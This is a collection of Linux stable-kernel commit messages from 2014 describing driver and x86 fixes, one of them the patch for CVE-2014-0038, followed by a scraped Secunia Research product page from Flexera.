rtlwifi: rtl8192c: Add new definitions in the dm\_common header
commit c908c74e005de780fddbe8cb6fcd44803f5d4b74 upstream.
Changes in the gain-control mechanism will require some changes in the header.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 4e4aeb96f7f390c7b4ce2ae4bbd5a95a5bb67ec9
Author: Larry Finger
Date: Mon Nov 18 11:11:28 2013 -0600
rtlwifi: Set the link state
commit 619ce76f8bb850b57032501a39f26aa6c6731c70 upstream.
The present code fails to set the linked state when an interface is
added.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 03b3daeede578a31865e70158853424a6d5bcaae
Author: Larry Finger
Date: Mon Nov 18 11:11:27 2013 -0600
rtlwifi: Redo register save locations
commit b9a758a8c905fc59e783ae91ad645452d877ea88 upstream.
The initial USB driver did not use some register save locations in the
private data storage. To save some memory, a union was used to overlay these
variables with USB I/O components. In an update of the gain-control code,
these register save locations are now needed for USB drivers.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit fc3fd60626d3ba4327b3f20d96fde5c5b2aa14e3
Author: Larry Finger
Date: Mon Nov 18 11:11:26 2013 -0600
rtlwifi: rtl8192cu: Add new firmware
commit 62009b7f12793c932aaba0df946b04cb4a77d022 upstream.
Vendor driver rtl8188C\_8192C\_8192D\_usb\_linux\_v3.4.2\_3727.20120404 introduced
new firmware for these chips. The code try for the new file, and fall back to
the original firmware if the new file is not available.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 6c4d4787020c56cb8bb186194ce2abc3210f2d60
Author: Larry Finger
Date: Mon Nov 18 11:11:25 2013 -0600
rtlwifi: rtl8192c: Prevent reconnect attempts if not connected
commit 8fd77aec1a9d6f4328fc0244f21932114e066df3 upstream.
This driver has a watchdog timer that attempts to reconnect when beacon frames
are not seen for 6 seconds. This patch disables that reconnect whenever the
device has never been connected.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 65027c0384b355195a928e6ab720f52384c68a62
Author: Larry Finger
Date: Mon Nov 18 11:11:31 2013 -0600
rtlwifi: Update beacon statistics for USB driver
commit 65b9cc97c6852fae19dc5c7745e9abc8dd380aad upstream.
The USB drivers were not updating the beacon statistics, which led to
false beacon loss indications.
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit 982380a2c1d60eadf1cd3c7d1a05119421e5d172
Author: Larry Finger
Date: Thu Jan 9 10:27:27 2014 -0600
rtlwifi: rtl8192cu: Add new device ID
commit f87f960b2fb802f26ee3b00c19320e57a9c583ff upstream.
Reported-by: Jan Prinsloo
Tested-by: Jan Prinsloo
Signed-off-by: Larry Finger
Signed-off-by: John W. Linville
Signed-off-by: Greg Kroah-Hartman
commit fe7ce71955f9e3462de8b345d352a7acfcc09e81
Author: Peter Chen
Date: Fri Jan 10 13:51:26 2014 +0800
usb: ehci: add freescale imx28 special write register method
commit feffe09f510c475df082546815f9e4a573f6a233 upstream.
According to Freescale imx28 Errata, "ENGR119653 USB: ARM to USB
register error issue", All USB register write operations must
use the ARM SWP instruction. So, we implement a special ehci\_write
for imx28.
Discussion for it at below:
http://marc.info/?l=linux-usb&m=137996395529294&w=2
Without this patcheset, imx28 works unstable at high AHB bus loading.
If the bus loading is not high, the imx28 usb can work well at the most
of time. There is a IC errata for this problem, usually, we consider
IC errata is a problem not a new feature, and this workaround is needed
for that, so we need to add them to stable tree 3.11+.
Cc: robert.hodaszi@digi.com
Signed-off-by: Peter Chen
Acked-by: Alan Stern
Signed-off-by: Marc Kleine-Budde
Tested-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit dce790e4a650df7a40ca030f8ac754f6a029de07
Author: Alan Stern
Date: Tue Jan 7 10:43:02 2014 -0500
USB: fix race between hub\_disconnect and recursively\_mark\_NOTATTACHED
commit 543d7784b07ffd16cc82a9cb4e1e0323fd0040f1 upstream.
There is a race in the hub driver between hub\_disconnect() and
recursively\_mark\_NOTATTACHED(). This race can be triggered if the
driver is unbound from a device at the same time as the bus's root hub
is removed. When the race occurs, it can cause an oops:
BUG: unable to handle kernel NULL pointer dereference at 0000015c
IP: [] recursively\_mark\_NOTATTACHED+0x20/0x60
Call Trace:
[] recursively\_mark\_NOTATTACHED+0x34/0x60
[] recursively\_mark\_NOTATTACHED+0x34/0x60
[] recursively\_mark\_NOTATTACHED+0x34/0x60
[] recursively\_mark\_NOTATTACHED+0x34/0x60
[] usb\_set\_device\_state+0x92/0x120
[] usb\_disconnect+0x2b/0x1a0
[] usb\_remove\_hcd+0xb0/0x160
[] ? \_raw\_spin\_unlock\_irqrestore+0x26/0x50
[] ehci\_mid\_remove+0x1c/0x30
[] ehci\_mid\_stop\_host+0x16/0x30
[] penwell\_otg\_work+0xd28/0x3520
[] ? \_\_schedule+0x39b/0x7f0
[] ? sub\_preempt\_count+0x3d/0x50
[] process\_one\_work+0x11d/0x3d0
[] ? mutex\_unlock+0xd/0x10
[] ? manage\_workers.isra.24+0x1b5/0x270
[] worker\_thread+0xf9/0x320
[] ? \_raw\_spin\_unlock\_irqrestore+0x26/0x50
[] ? rescuer\_thread+0x2b0/0x2b0
[] kthread+0x94/0xa0
[] ret\_from\_kernel\_thread+0x1b/0x28
[] ? kthread\_create\_on\_node+0xc0/0xc0
One problem is that recursively\_mark\_NOTATTACHED() uses the intfdata
value and hub->hdev->maxchild while hub\_disconnect() is clearing them.
Another problem is that it uses hub->ports[i] while the port device is
being released.
To fix this race, we need to hold the device\_state\_lock while
hub\_disconnect() changes the values. (Note that usb\_disconnect()
and hub\_port\_connect\_change() already acquire this lock at similar
critical times during a USB device's life cycle.) We also need to
remove the port devices after maxchild has been set to 0, instead of
before.
Signed-off-by: Alan Stern
Reported-by: "Du, Changbin"
Tested-by: "Du, Changbin"
Signed-off-by: Greg Kroah-Hartman
commit 241e39dcafe2ff5ef2914c8f05ce0a983c2a63ed
Author: Jack Pham
Date: Fri Nov 15 14:53:14 2013 -0800
usb: xhci: Check for XHCI\_PLAT in xhci\_cleanup\_msix()
commit 9005355af23856c55a5538c9024355785424821b upstream.
If CONFIG\_PCI is enabled, make sure xhci\_cleanup\_msix()
doesn't try to free a bogus PCI IRQ or dereference an invalid
pci\_dev when the xHCI device is actually a platform\_device.
This patch should be backported to kernels as old as 3.9, that
contain the commit 52fb61250a7a132b0cfb9f4a1060a1f3c49e5a25
"xhci-plat: Don't enable legacy PCI interrupts."
Signed-off-by: Jack Pham
Signed-off-by: Sarah Sharp
Signed-off-by: Greg Kroah-Hartman
commit 6a345958ecfd9211633ffec338426b3a9c1f3493
Author: Mikhail Zolotaryov
Date: Sat Dec 28 01:56:35 2013 +0200
USB: Nokia 502 is an unusual device
commit 0e16114f2db4838251fb64f3b550996ad3585890 upstream.
The USB storage operation of Nokia Asha 502 Dual SIM smartphone running Asha
Platform 1.1.1 is unreliable in respect of data consistency (i.e. transfered
files are corrupted). A similar issue is described here:
http://discussions.nokia.com/t5/Asha-and-other-Nokia-Series-30/Nokia-301-USB-transfers-and-corrupted-files/td-p/1974170
The workaround is (MAX\_SECTORS\_64):
rmmod usb\_storage && modprobe usb\_storage quirks=0421:06aa:m
The patch adds the tested device to the unusual list permanently.
Signed-off-by: Mikhail Zolotaryov
Signed-off-by: Greg Kroah-Hartman
commit 9d4f3c7eb2692b07fda28465486fb155c8c46a04
Author: Colin Leitner
Date: Mon Jan 6 21:33:54 2014 +0100
USB: ftdi\_sio: added CS5 quirk for broken smartcard readers
commit c1f15196ac3b541d084dc80a8fbd8a74c6a0bd44 upstream.
Genuine FTDI chips support only CS7/8. A previous fix in commit
8704211f65a2 ("USB: ftdi\_sio: fixed handling of unsupported CSIZE
setting") enforced this limitation and reported it back to userspace.
However, certain types of smartcard readers depend on specific
driver behaviour that requests 0 data bits (not 5) to change into a
different operating mode if CS5 has been set.
This patch reenables this behaviour for all FTDI devices.
Tagged to be added to stable, because it affects a lot of users of
embedded systems which rely on these readers to work properly.
Reported-by: Heinrich Siebmanns
Tested-by: Heinrich Siebmanns
Signed-off-by: Colin Leitner
Signed-off-by: Johan Hovold
Signed-off-by: Greg Kroah-Hartman
commit 60b5c6f40e357b87e465ff8a94befb019f1bcc9e
Author: Johan Hovold
Date: Thu Jan 2 22:49:24 2014 +0100
USB: cypress\_m8: fix ring-indicator detection and reporting
commit 440ebadeae9298d7de3d4d105342691841ec88d0 upstream.
Fix ring-indicator (RI) status-bit definition, which was defined as CTS,
effectively preventing RI-changes from being detected while reporting
false RI status.
This bug predates git.
Signed-off-by: Johan Hovold
Signed-off-by: Greg Kroah-Hartman
commit efd921a4d74c1bf2d580593ee63dfe60fbe3ca79
Author: Rahul Bedarkar
Date: Thu Jan 2 20:57:56 2014 +0530
USB: serial: add support for iBall 3.5G connect usb modem
commit 7d5c1b9c7cb5ec8e52b1adc65c484a923a8ea6c3 upstream.
Add support for iBall 3.5G connect usb modem.
$lsusb
Bus 002 Device 006: ID 1c9e:9605 OMEGA TECHNOLOGY
$usb-devices
T: Bus=02 Lev=01 Prnt=01 Port=00 Cnt=01 Dev#= 6 Spd=480 MxCh= 0
D: Ver= 2.00 Cls=00(>ifc ) Sub=00 Prot=00 MxPS=64 #Cfgs= 1
P: Vendor=1c9e ProdID=9605 Rev=00.00
S: Manufacturer=USB Modem
S: Product=USB Modem
S: SerialNumber=1234567890ABCDEF
C: #Ifs= 5 Cfg#= 1 Atr=e0 MxPwr=500mA
I: If#= 0 Alt= 0 #EPs= 2 Cls=ff(vend.) Sub=ff Prot=ff Driver=option
I: If#= 1 Alt= 0 #EPs= 2 Cls=ff(vend.) Sub=ff Prot=ff Driver=option
I: If#= 2 Alt= 0 #EPs= 2 Cls=ff(vend.) Sub=ff Prot=ff Driver=option
I: If#= 3 Alt= 0 #EPs= 3 Cls=ff(vend.) Sub=ff Prot=ff Driver=option
I: If#= 4 Alt= 0 #EPs= 2 Cls=08(stor.) Sub=06 Prot=50 Driver=usb-storage
Signed-off-by: Rahul Bedarkar
Suggested-by: Bjørn Mork
Signed-off-by: Greg Kroah-Hartman
commit c2e054829425ea747cf150354413763b1fcb9db4
Author: 张君
Date: Wed Dec 18 15:37:17 2013 +0800
usb: option: add new zte 3g modem pids to option driver
commit 4d90b819ae4c7ea8fd5e2bb7edc68c0f334be2e4 upstream.
Signed-off-by: Jun zhang
Signed-off-by: Greg Kroah-Hartman
commit 90cf43ef61389b287bd0f0c4af65b1ba4dc7862f
Author: Johan Hovold
Date: Sun Dec 29 19:22:53 2013 +0100
USB: pl2303: fix data corruption on termios updates
commit 623c8263376c0b8a4b0c220232e7313d762cd0cc upstream.
Some PL2303 devices are known to lose bytes if you change serial
settings even to the same values as before. Avoid this by comparing the
encoded settings with the previsouly used ones before configuring the
device.
The common case was fixed by commit bf5e5834bffc6 ("pl2303: Fix mode
switching regression"), but this problem was still possible to trigger,
for instance, by using the TCSETS2-interface to repeatedly request
115201 baud, which gets mapped to 115200 and thus always triggers a
settings update.
Cc: Frank Schäfer
Signed-off-by: Johan Hovold
Signed-off-by: Greg Kroah-Hartman
commit 3b1fa541dc6cb41cd208af9ea5221b30e12713ee
Author: Heikki Krogerus
Date: Wed Dec 18 16:41:25 2013 +0200
usb: dwc3: fix the glue drivers using the nop phy
commit 13518673f1419f2667985a6fca4543e44143408b upstream.
The reset\_gpio member of the usb\_phy\_gen\_xceiv\_platform\_data
structure needs the have negative value or phy-generic's
probe will fail unless DT is used. 0 is a valid gpio number.
This fixes an issue where phy-generic fails to probe with
message: "usb\_phy\_gen\_xceiv.0: Error requesting RESET GPIO 0".
Signed-off-by: Heikki Krogerus
Signed-off-by: Felipe Balbi
Signed-off-by: Greg Kroah-Hartman
commit d1f9d7eca2bcad07afc898243171c4dc031e8ae4
Author: Bjørn Mork
Date: Sun Jan 12 21:48:53 2014 +0100
usb: cdc-wdm: resp\_count can be 0 even if WDM\_READ is set
commit f563926fed982f26b391ca42493f55f2447f1b0a upstream.
Do not decrement resp\_count if it's already 0.
We set resp\_count to 0 when the device is closed. The next open and
read will try to clear the WDM\_READ flag if there was leftover data
in the read buffer. This fix is necessary to prevent resubmitting
the read URB in a tight loop because resp\_count becomes negative.
The bug can easily be triggered from userspace by not reading all
data in the read buffer, and then closing and reopening the chardev.
Fixes: 8dd5cd5395b9 ("usb: cdc-wdm: avoid hanging on zero length reads")
Signed-off-by: Bjørn Mork
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Greg Kroah-Hartman
commit c91a8012d127d5e95376e11079f725a80f98b08b
Author: Bjørn Mork
Date: Fri Dec 20 14:07:24 2013 +0100
usb: cdc-wdm: avoid hanging on zero length reads
commit 8dd5cd5395b90070d98149d0a94e5981a74cd2ec upstream.
commit 73e06865ead1 ("USB: cdc-wdm: support back-to-back
USB\_CDC\_NOTIFY\_RESPONSE\_AVAILABLE notifications") implemented
queued response handling. This added a new requirement: The read
urb must be resubmitted every time we clear the WDM\_READ flag if
the response counter indicates that the device is waiting for a
read.
Fix by factoring out the code handling the WMD\_READ clearing and
possible urb submission, calling it everywhere we clear the flag.
Without this fix, the driver ends up in a state where the read urb
is inactive, but the response counter is positive after a zero
length read. This prevents the read urb from ever being submitted
again and the driver appears to be hanging.
Fixes: 73e06865ead1 ("USB: cdc-wdm: support back-to-back USB\_CDC\_NOTIFY\_RESPONSE\_AVAILABLE notifications")
Cc: Greg Suarez
Signed-off-by: Bjørn Mork
Signed-off-by: Greg Kroah-Hartman
commit a348d7614c3b52c0b6d28f1a9fdd08a122d8def3
Author: Peter Chen
Date: Fri Jan 10 13:51:32 2014 +0800
usb: chipidea: udc: using MultO at TD as real mult value for ISO-TX
commit 2fc5a7dace3c43e62402ab4e8800a8f1834ffe2a upstream.
We have met a bug that the high bandwidth ISO-TX transfer has failed
at the last packet if it is less than 1024, the TD status shows it
is "Transaction Error".
The root cause of this problem is: the mult value at qh is not correct
for current TD's transfer length. We use TD list to queue un-transfer
TDs, and change mult for new adding TDs. If new adding TDs transfer length
less than 1024, but the queued un-transfer TDs transfer length is larger
than 1024, the transfer error will occur, and vice versa.
Usually, this problem occurs at the last packet, and the first packet for
new frame.
We fixed this problem by setting Mult at QH as the largest value (3), and
set MultO (Multiplier Override) at TD according to every transfer length.
It can cover both hardware version less than 2.3 (the real mult is MultO
if it is not 0) and 2.3+ (the real mult is min(qh.mult, td.multo)).
Since the MultO bits are only existed at TX TD, we keep the ISO-RX behavior
unchanged.
For stable tree: 3.11+.
Cc: Michael Grzeschik
Reported-by: Matthieu Vanin
Tested-by: Matthieu Vanin
Signed-off-by: Peter Chen
Signed-off-by: Greg Kroah-Hartman
commit 1dd4f26f0b4292ecc591ac61987f4996356feba4
Author: Peter Chen
Date: Fri Jan 10 13:51:31 2014 +0800
usb: chipidea: need to mask INT\_STATUS when write otgsc
commit 5332ff1fb63c46588656e4208201bc131627c878 upstream.
For otgsc, both enable bits and status bits are in it. So we need
to make sure the status bits are not be cleared when write enable
bits. It can fix one bug that we plug in/out Micro AB cable fast,
and sometimes, the IDIS will be cleared wrongly when handle last
ID interrupt (ID 0->1), so the current interrupt will not occur.
For stable tree: 3.12+
Signed-off-by: Peter Chen
Signed-off-by: Greg Kroah-Hartman
commit c864872d32fa288aef50508908a4d0f1bc290b69
Author: Peter Chen
Date: Fri Jan 10 13:51:28 2014 +0800
usb: chipidea: imx: set CI\_HDRC\_IMX28\_WRITE\_FIX for imx28
commit 1071055e2a118a81c0b300d7f4af7eba3f7a7c82 upstream.
Due to imx28 needs ARM swp instruction for writing, we set
CI\_HDRC\_IMX28\_WRITE\_FIX for imx28.
This patch is needed for stable tree 3.11+
Cc: robert.hodaszi@digi.com
Signed-off-by: Peter Chen
Signed-off-by: Marc Kleine-Budde
Tested-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit 1d503f1a90538a068b0efd62757af9c11e119b36
Author: Peter Chen
Date: Fri Jan 10 13:51:27 2014 +0800
usb: chipidea: add freescale imx28 special write register method
commit ed8f8318d2ef3e5f9e4ddf79349508c116b68d7f upstream.
According to Freescale imx28 Errata, "ENGR119653 USB: ARM to USB
register error issue", All USB register write operations must
use the ARM SWP instruction. So, we implement special hw\_write
and hw\_test\_and\_clear for imx28.
Discussion for it at below:
http://marc.info/?l=linux-usb&m=137996395529294&w=2
This patch is needed for stable tree 3.11+.
Cc: robert.hodaszi@digi.com
Signed-off-by: Peter Chen
Signed-off-by: Marc Kleine-Budde
Tested-by: Marc Kleine-Budde
Signed-off-by: Greg Kroah-Hartman
commit 4ba10fc2d81a087e69fb782e4c8a0fc54f5084df
Author: Paolo Bonzini
Date: Mon Jan 27 14:51:44 2014 +0100
x86, kvm: correctly access the KVM\_CPUID\_FEATURES leaf at 0x40000101
commit 77f01bdfa5e55dc19d3eb747181d2730a9bb3ca8 upstream.
When Hyper-V hypervisor leaves are present, KVM must relocate
its own leaves at 0x40000100, because Windows does not look for
Hyper-V leaves at indices other than 0x40000000. In this case,
the KVM features are at 0x40000101, but the old code would always
look at 0x40000001.
Fix by using kvm\_cpuid\_base(). This also requires making the
function non-inline, since kvm\_cpuid\_base() is static.
Fixes: 1085ba7f552d84aa8ac0ae903fa8d0cc2ff9f79d
Cc: mtosatti@redhat.com
Signed-off-by: Paolo Bonzini
Signed-off-by: Greg Kroah-Hartman
commit b94c2ba692234e31150b025ad270e8220d4b03a4
Author: Paolo Bonzini
Date: Mon Jan 27 14:49:40 2014 +0100
x86, kvm: cache the base of the KVM cpuid leaves
commit 1c300a40772dae829b91dad634999a6a522c0829 upstream.
It is unnecessary to go through hypervisor\_cpuid\_base every time
a leaf is found (which will be every time a feature is requested
after the next patch).
Fixes: 1085ba7f552d84aa8ac0ae903fa8d0cc2ff9f79d
Cc: mtosatti@redhat.com
Signed-off-by: Paolo Bonzini
Signed-off-by: Greg Kroah-Hartman
commit 7581173b4e52437936ed39d20b48418b1cdecd31
Author: Marcelo Tosatti
Date: Mon Jan 6 12:00:02 2014 -0200
KVM: x86: limit PIT timer frequency
commit 9ed96e87c5748de4c2807ef17e81287c7304186c upstream.
Limit PIT timer frequency similarly to the limit applied by
LAPIC timer.
Reviewed-by: Jan Kiszka
Signed-off-by: Marcelo Tosatti
Signed-off-by: Paolo Bonzini
Signed-off-by: Greg Kroah-Hartman
commit 965918eb863be707d548683b5165cfb30deb8d1c
Author: Dave Young
Date: Fri Dec 20 18:02:15 2013 +0800
x86/efi: Fix off-by-one bug in EFI Boot Services reservation
commit a7f84f03f660d93574ac88835d056c0d6468aebe upstream.
Current code check boot service region with kernel text region by:
start+size >= \_\_pa\_symbol(\_text)
The end of the above region should be start + size - 1 instead.
I see this problem in ovmf + Fedora 19 grub boot:
text start: 1000000 md start: 800000 md size: 800000
Signed-off-by: Dave Young
Acked-by: Borislav Petkov
Acked-by: Toshi Kani
Tested-by: Toshi Kani
Signed-off-by: Matt Fleming
Signed-off-by: Greg Kroah-Hartman
commit 0c51097273237d079ef67aa819e904e484e382ca
Author: Ben Hutchings
Date: Tue Dec 31 20:46:27 2013 +0100
xen/pci: Fix build on non-x86
commit b7ef4a6dd35d1b47db72fbd1a31c8fd0da7a74f3 upstream.
We can't include  if this isn't x86, and we only need
it if CONFIG\_PCI\_MMCONFIG is enabled.
Fixes: 8deb3eb1461e ('xen/mcfg: Call PHYSDEVOP\_pci\_mmcfg\_reserved for MCFG areas.')
Signed-off-by: Ben Hutchings
Signed-off-by: Konrad Rzeszutek Wilk
Reviewed-by: David Vrabel
Acked-by: Ian Campbell
Signed-off-by: Greg Kroah-Hartman
commit 921ce180818a8a3b52fbe02e747695d51a46f5e1
Author: PaX Team
Date: Thu Jan 30 16:59:25 2014 -0800
x86, x32: Correct invalid use of user timespec in the kernel
commit 2def2ef2ae5f3990aabdbe8a755911902707d268 upstream.
The x32 case for the recvmsg() timout handling is broken:
asmlinkage long compat\_sys\_recvmmsg(int fd, struct compat\_mmsghdr \_\_user \*mmsg,
unsigned int vlen, unsigned int flags,
struct compat\_timespec \_\_user \*timeout)
{
int datagrams;
struct timespec ktspec;
if (flags & MSG\_CMSG\_COMPAT)
return -EINVAL;
if (COMPAT\_USE\_64BIT\_TIME)
return \_\_sys\_recvmmsg(fd, (struct mmsghdr \_\_user \*)mmsg, vlen,
flags | MSG\_CMSG\_COMPAT,
(struct timespec \*) timeout);
...
The timeout pointer parameter is provided by userland (hence the \_\_user
annotation) but for x32 syscalls it's simply cast to a kernel pointer
and is passed to \_\_sys\_recvmmsg which will eventually directly
dereference it for both reading and writing. Other callers to
\_\_sys\_recvmmsg properly copy from userland to the kernel first.
The bug was introduced by commit ee4fa23c4bfc ("compat: Use
COMPAT\_USE\_64BIT\_TIME in net/compat.c") and should affect all kernels
since 3.4 (and perhaps vendor kernels if they backported x32 support
along with this code).
Note that CONFIG\_X86\_X32\_ABI gets enabled at build time and only if
CONFIG\_X86\_X32 is enabled and ld can build x32 executables.
Other uses of COMPAT\_USE\_64BIT\_TIME seem fine.
This addresses CVE-2014-0038.
Signed-off-by: PaX Team
Signed-off-by: H. Peter Anvin
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 41d3f491c9cf265f757bcbab663ec34ff84748fa
Author: David Rientjes
Date: Thu Jan 30 15:46:08 2014 -0800
mm/mempolicy.c: fix mempolicy printing in numa\_maps
commit 8790c71a18e5d2d93532ae250bcf5eddbba729cd upstream.
As a result of commit 5606e3877ad8 ("mm: numa: Migrate on reference
policy"), /proc//numa\_maps prints the mempolicy for any  as
"prefer:N" for the local node, N, of the process reading the file.
This should only be printed when the mempolicy of  is
MPOL\_PREFERRED for node N.
If the process is actually only using the default mempolicy for local
node allocation, make sure "default" is printed as expected.
Signed-off-by: David Rientjes
Reported-by: Robert Lippert
Cc: Peter Zijlstra
Acked-by: Mel Gorman
Cc: Ingo Molnar
Signed-off-by: Andrew Morton
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 4a466742d28b10d696e79b1c77996e2f72536ba7
Author: Aristeu Rozanski
Date: Thu Dec 5 10:37:56 2013 -0500
e752x\_edac: Fix pci\_dev usage count
commit 90ed4988b8c030d65b41b7d13140e9376dc6ec5a upstream.
In case the device 0, function 1 is not found using pci\_get\_device(),
pci\_scan\_single\_device() will be used but, differently than
pci\_get\_device(), it allocates a pci\_dev but doesn't does bump the usage
count on the pci\_dev and after few module removals and loads the pci\_dev
will be freed.
Signed-off-by: Aristeu Rozanski
Reviewed-by: mark gross
Link: http://lkml.kernel.org/r/20131205153755.GL4545@redhat.com
Signed-off-by: Borislav Petkov
Cc: Jean Delvare
Signed-off-by: Greg Kroah-Hartman


=== Content from secunia.com_0285744b_20250124_220337.html ===


[Skip to main content](#main-content)
[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

[![Home](/themes/custom/flexera/images/logo.svg)](https://www.flexera.com/)

Search

## Main navigation

* Solutions
  + Column 1
    - Business challenge
      * [Software renewals and audits](https://www.flexera.com/solutions/software-renewals-audits)
      * [Software license management and optimization](https://www.flexera.com/solutions/software-usage-costs)
      * [SaaS spend management](https://www.flexera.com/solutions/saas-spend)
      * [Cloud cost management](https://www.flexera.com/solutions/cloud-cost)
      * [IT asset lifecycle management](https://www.flexera.com/solutions/it-asset-lifecycle)
      * [CMDB data quality](https://www.flexera.com/solutions/cmdb-data-quality)
      * [Accurate IT inventory](https://www.flexera.com/solutions/it-inventory)
      * [Security and regulatory risk management](https://www.flexera.com/solutions/it-security-regulatory-risk)
      * [Sustainable IT](https://www.flexera.com/solutions/sustainable-it)
      * [AI-powered transformation](https://www.flexera.com/solutions/ai-powered-transformation)
      * [Public sector](https://www.flexera.com/solutions/public-sector)
  + Column 2
    - Spend management by vendor
      * [IBM](https://www.flexera.com/solutions/vendor/ibm)
      * [Oracle](https://www.flexera.com/solutions/vendor/oracle)
      * [Microsoft](https://www.flexera.com/solutions/vendor/microsoft)
      * [SAP](https://www.flexera.com/solutions/vendor/sap)
      * [VMware](https://www.flexera.com/solutions/vendor/vmware)
      * [ServiceNow](https://www.flexera.com/solutions/vendor/servicenow)
      * [AWS](https://www.flexera.com/solutions/vendor/aws)
      * [Salesforce](https://www.flexera.com/solutions/vendor/salesforce)
      * [BMC](https://www.flexera.com/solutions/cmdb-data-quality/bmc)
      * [Adobe](https://www.flexera.com/solutions/vendor/adobe)

  ### Achieve more through a united FinOps and ITAM function

  The future is hybrid. Break down the walls between ITAM and FinOps to drive more revenue, more customer growth and more innovation.

  [Discover More](https://www.flexera.com/resources/hybrid-itam-finops)
* Products
  + Column 1
    - [Flexera One](https://www.flexera.com/products/flexera-one)
      * [IT Visibility](https://www.flexera.com/products/flexera-one/it-visibility)
      * [ITAM](https://www.flexera.com/products/flexera-one/it-asset-management)
      * [SaaS Management](https://www.flexera.com/products/flexera-one/saas-management)
      * [FinOps](https://www.flexera.com/products/flexera-one/finops)
      * [Technology Intelligence Platform](https://www.flexera.com/products/flexera-one/technology-intelligence-platform)
  + Column 2
    - [Snow Atlas](https://www.flexera.com/products/snow-atlas)
      * [Snow Spend Optimizer](https://www.flexera.com/products/snow-atlas/snow-spend-optimizer)
      * [Snow SaaS Management](https://www.flexera.com/products/snow-atlas/snow-saas-management)
  + Column 3
    - Hide group
      * [Security](https://www.flexera.com/products/security)
      * [Application Readiness](https://www.flexera.com/products/adminstudio)
      * [All products](https://www.flexera.com/products)
      * [All Snow products](https://www.flexera.com/products/snow)
      * [Integrations](https://www.flexera.com/products/integrations)

  ### Flexera 2024 State of the Cloud Report

  What do transformative initiatives such as GenAI, machine learning and sustainability mean for the cloud? Check out the 2024 State of the Cloud Report to find the answer as well as all the latest cloud computing trends.

  [View Report](https://info.flexera.com/CM-REPORT-State-of-the-Cloud)
* Success
  + Column 1
    - [Customer success](https://www.flexera.com/customer-success)
      * Support
        + [Flexera support portal](https://community.flexera.com/s/support-hub)
        + [Flexera product documentation](https://docs.flexera.com)
        + [Snow product documentation](https://docs.snowsoftware.io/)
      * Services and training
        + [Services](https://www.flexera.com/customer-success/services)
        + [Training](https://www.flexera.com/customer-success/training)
  + Column 2
    - Hide group
      * [Technology Intelligence Awards](https://www.flexera.com/customer-success/awards)
      * [Flexera community](https://community.flexera.com/s/)

  ### Insights from Gartner®

  Find a curated series of actionable and objective insights for IT executives and their teams. Get expert insights from valued analysts, courtesy of Flexera.

  [Discover More](https://www.flexera.com/resources/gartner-analyst-research)
* Resources
  + Column 1
    - [Resources](https://www.flexera.com/resources)
      * [Webinars](https://www.flexera.com/resources?type%5Bwebinar%5D=webinar)
      * [Videos](https://www.flexera.com/resources?type%5Bvideo%5D=video)
      * [Datasheets](https://www.flexera.com/resources?type%5Bdatasheet%5D=datasheet)
      * [White papers & reports](https://www.flexera.com/resources?type%5Bwhite-paper-industry-report%5D=white-paper-industry-report)
  + Column 2
    - Hide group
      * [Blog](/blog/)
      * [Case studies](https://www.flexera.com/resources/case-studies)
      * [Events](https://www.flexera.com/resources?type%5Bevent%5D=event)
      * [Analyst Research](https://www.flexera.com/resources/gartner-analyst-research)
      * [Glossary](https://www.flexera.com/resources/glossary)
      * [Demos & trials](https://www.flexera.com/resources?type%5Bdemo-trials%5D=demo-trials)
      * [Business value calculator](https://www.flexera.com/resources/business-value-calculator)

  ### Flexera 2025 IT Priorities Report

  Insights from Flexera’s 2025 IT Priorities Report highlight what’s top of mind for IT decision makers in the year ahead. Discover the challenges, priorities and opportunities that will shape the future IT landscape.

  [View Report](https://info.flexera.com/ITV-REPORT-IT-Priorities)
* About
  + Column 1
    - [Company](https://www.flexera.com/about-us)
      * [About](https://www.flexera.com/about-us)
      * [Careers](https://www.flexera.com/about-us/careers)
      * [Contact](https://www.flexera.com/about-us/contact-us)
      * [Leadership](https://www.flexera.com/about-us/leadership)
    - [Partners](https://www.flexera.com/about-us/partners)
      * [Partner program](https://www.flexera.com/about-us/partners/partner-program)
      * [Partner directory](https://www.flexera.com/about-us/partners/directory)
  + Column 2
    - [Press center](https://www.flexera.com/about-us/press-center)
      * [Press releases](https://www.flexera.com/about-us/all-press-releases)
      * [Awards](https://www.flexera.com/about-us/press-center#awards)
      * [Articles](https://www.flexera.com/about-us/all-articles)
    - Hide group
      * Social responsibility
        + [ESG](https://www.flexera.com/about-us/environmental-social-governance)
        + [Diversity](https://www.flexera.com/about-us/diversity)

  ### More value with technology intelligence

  The unparalleled synergy of Flexera and Snow provides the Technology Intelligence you need for more efficiency, insight and governance than ever before.

  [Discover More](https://www.flexera.com/more-value-with-technology-intelligence)

Search

en

* [English](https://www.flexera.com/products/security/software-vulnerability-research/secunia-research?referrer=secunia)
* [Deutsch](https://www.flexera.de/products/security/software-vulnerability-research/secunia-research?referrer=secunia)

## External Links

* External Links
  + [Community](https://community.flexera.com/)
  + [Product Access](https://app.flexera.com/login)
  + [Partner Portal](https://flexera.channeltivity.com/Login)

[Book a demo](/about-us/contact-us?C_Interest1=sales)

# Secunia Research

## The world’s best vulnerability intelligence

The Secunia Research team from Flexera provides the most accurate and reliable source of vulnerability intelligence.

[Contact Us](https://www.flexera.com/about-us/contact-us?C_Interest1=sales&C_SolutionInterest=SVM)
Watch video (0:29)

Related links

* [Anatomy of a security advisory](https://www.flexera.com/resources/infographics/anatomy-of-a-security-advisory)
* [Software Vulnerability Research](https://www.flexera.com/products/software-vulnerability-research)
* [Software Vulnerability Manager](/products/software-vulnerability-manager)
* [Security advisories from Secunia Research](https://www.flexera.com/products/security/software-vulnerability-advisories)
